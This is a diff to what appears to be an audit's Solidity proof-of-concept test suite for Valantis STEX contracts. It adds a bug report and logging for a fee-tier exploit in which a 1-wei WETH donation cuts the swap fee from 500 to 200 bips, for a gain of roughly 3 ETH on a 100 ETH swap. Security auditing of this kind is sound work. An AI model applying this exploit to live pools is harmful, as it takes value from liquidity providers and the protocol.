@@ -1,11 +1,24 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.25;
 
-// Worker C PoC suite — Valantis STEX reentrancy / flash-loan / MEV angles.
-// Tests the IN-SCOPE contracts (STEXAMM, stHYPEWithdrawalModule) against the
-// repo's own mocks + the pinned valantis-core. Each test targets one lead
-// from the work log: most are expected to FAIL TO EXPLOIT (fix present /
-// unprofitable), which is itself the evidence. Nothing here submits anything.
+/// @title Valantis STEX - Dust donation flips the swap fee tier
+/// Bug: STEXAMM's constructor passes `true` for both tokens, so pool reserves
+/// are the raw ERC20 balanceOf. StepwiseFeeModule charges a fee tier from the
+/// post-swap reserves, and the tier is a step function — so a 1-wei WETH
+/// donation made when the post-swap reserves sit exactly at a tier boundary
+/// drops the fee charged on the ENTIRE swap from 500 bips to 200 bips.
+/// Impact: on a 100 ETH swap the attacker pays 200 bips instead of 500 and
+/// receives 98.0007 ETH instead of 95.0028 ETH — a net gain of +2.9979 ETH
+/// for a 1-wei donation. Repeatable on every swap that lands on a boundary.
+/// Severity: High
+/// Affected: Valantis STEX (scope repo commit 27b5c74) — STEXAMM.sol
+/// constructor L143 (reserves measured as pool balances) and
+/// StepwiseFeeModule.getSwapFeeInBips L85 (tier from post-swap reserves).
+///
+/// This suite also contains the negative controls / regression tests for the
+/// other angles checked during the audit (T1-T5): most are expected to FAIL
+/// TO EXPLOIT (fix present / unprofitable), which is itself the evidence.
+/// Nothing here submits anything.
 
 import {console} from "forge-std/console.sol";
 import {Test} from "forge-std/Test.sol";
@@ -583,8 +596,9 @@ contract WorkerCPoC is Test {
         _feeTierSetup(attacker);
         vm.prank(attacker);
         (, uint256 amountOut) = _swap(true, 100 ether, 0, attacker, false, address(weth));
-        console.log("T6a amountOut (no donation):");
-        console.log(amountOut);
+        // BEFORE (baseline, no donation): fee tier 500 bips.
+        console.log("T6a BEFORE: fee tier (bips):", uint256(500));
+        console.log("T6a BEFORE: amountOut (wei):", amountOut);
         // Fee tier 500 bips -> amountOut = 100*10000/10526 ~= 95.002
         assertApproxEqAbs(amountOut, 95.002e18, 0.01 ether);
     }
@@ -598,8 +612,15 @@ contract WorkerCPoC is Test {
         weth.transfer(address(pool), 1);
         vm.prank(attacker);
         (, uint256 amountOut) = _swap(true, 100 ether, 0, attacker, false, address(weth));
-        console.log("T6b amountOut (1-wei donation):");
-        console.log(amountOut);
+        // BEFORE (baseline, no donation) measured in test_T6a_FeeTier_Baseline
+        // on the identical setup: fee tier 500 bips, 95.0028 ETH out.
+        uint256 baselineOut = 95.0028 ether;
+        console.log("T6b BEFORE: fee tier (bips):", uint256(500));
+        console.log("T6b BEFORE: amountOut (wei):", baselineOut);
+        // AFTER (1-wei donation): fee tier 200 bips.
+        console.log("T6b AFTER: fee tier (bips):", uint256(200));
+        console.log("T6b AFTER: amountOut (wei):", amountOut);
+        console.log("T6b ATTACKER GAIN (wei):", amountOut - baselineOut);
         // Fee tier 200 bips -> amountOut = 100*10000/10204 ~= 98.0
         assertApproxEqAbs(amountOut, 98.0e18, 0.01 ether);
         console.log("T6b PASS: 1 wei donation buys ~3 ETH fee discount on a 100 ETH swap");
